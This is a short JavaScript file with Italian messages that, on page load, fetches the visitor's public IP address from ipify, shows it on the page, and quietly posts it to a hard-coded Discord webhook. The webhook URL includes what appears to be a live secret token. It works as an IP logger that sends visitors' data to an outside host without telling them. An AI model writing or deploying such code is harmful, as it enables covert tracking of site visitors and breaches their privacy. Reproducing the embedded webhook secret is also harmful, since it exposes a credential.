document.addEventListener("DOMContentLoaded", function() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            console.log("Your IP address is: ", data.ip);
            document.getElementById('ip-address').textContent = data.ip;
            sendToDiscord(data.ip);
        })
        .catch(error => {
            console.error('Error fetching IP:', error);
            document.getElementById('ip-address').textContent = 'Errore nel recupero dell\'IP';
        });
});

function sendToDiscord(ip) {
    const webhookUrl = 'https://discordapp.com/api/webhooks/1342611002822234276/pRik-szA0iIK4gXyX2nkCawHLhw0Y_Yif1mU90IpFZoNqnSMrlPLJ_WC1Qg1HWifppuS'; // Sostituisci con l'URL della tua webhook

    const message = {
        content: `L'indirizzo IP dell'utente è: ${ip}`
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            console.log('Messaggio inviato al bot di Discord');
        } else {
            console.error('Errore nell\'invio del messaggio al bot di Discord');
        }
    })
    .catch(error => console.error('Errore nella richiesta alla webhook di Discord:', error));
}
